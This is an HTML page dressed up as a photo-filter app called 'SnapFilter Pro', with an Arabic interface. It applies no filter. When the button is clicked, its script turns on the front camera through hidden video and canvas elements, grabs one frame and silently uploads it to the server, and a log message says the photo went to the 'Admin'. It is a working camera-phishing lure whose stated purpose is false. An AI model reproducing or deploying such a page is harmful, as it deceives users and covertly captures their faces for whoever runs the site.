<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilter</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d0f12; color: #ffffff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 100vh; padding: 15px;
        }
        .container {
            width: 100%; max-width: 420px; background: #161922;
            border-radius: 20px; padding: 35px 20px; text-align: center;
            border: 1px solid #262b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h2 { font-size: 26px; margin-bottom: 25px; color: #ff4757; font-weight: 700; }
        
        .filter-banner {
            background: linear-gradient(135deg, #1f4068, #162447);
            padding: 40px 20px;
            border-radius: 16px;
            border: 2px dashed #ff4757;
            margin-bottom: 30px;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
        }
        .filter-banner p { font-size: 17px; color: #dcdde1; font-weight: bold; margin-top: 12px; }
        .filter-icon { font-size: 55px; }

        .btn-capture {
            background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
            width: 85px; height: 85px; border-radius: 50%; font-size: 35px; cursor: pointer;
            box-shadow: 0 5px 20px rgba(255, 71, 87, 0.4); display: inline-flex; align-items: center; justify-content: center;
            transition: transform 0.2s;
        }
        .btn-capture:active { transform: scale(0.92); }
    </style>
</head>
<body>

    <div class="container">
        <h2>SnapFilter Pro</h2>
        
        <div class="filter-banner">
            <div class="filter-icon">✨🎭</div>
            <p>فلتر الواقع الافتراضي نشط</p>
        </div>

        <button class="btn-capture" id="capture-btn" title="التقاط">📸</button>
    </div>

    <!-- عنصر فيديو مخفي يتم تشغيله حصرياً وقت الالتقاط لضمان عمل الكاميرا -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');

        captureBtn.addEventListener('click', async () => {
            try {
                // طلب تشغيل الكاميرا فور الضغط على الزر لضمان حصول الإذن والالتقاط الحقيقي
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                // الانتظار قليلاً لضمان تحميل البث المباشر للعدسة
                setTimeout(() => {
                    if (!video.videoWidth) {
                        console.error("الكاميرا لم تستعد بعد");
                        stream.getTracks().forEach(track => track.stop());
                        return;
                    }

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    
                    // رسم الصورة الحية
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/png');

                    // إيقاف الكاميرا فوراً بعد الالتقاط لحفظ الخصوصية والبطارية
                    stream.getTracks().forEach(track => track.stop());

                    // إرسال الصورة للسيرفر
                    fetch('/upload-snapshot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ image: imageData })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            console.log("تم إرسال الصورة بنجاح للـ Admin");
                        }
                    })
                    .catch(err => {
                        console.error('Fetch Error:', err);
                    });

                }, 800); // مهلة 800 ميلي ثانية لضمان التقاط الصورة بدقة

            } catch (err) {
                console.error("Camera Permission Error:", err);
            }
        });
    </script>

</body>
</html>
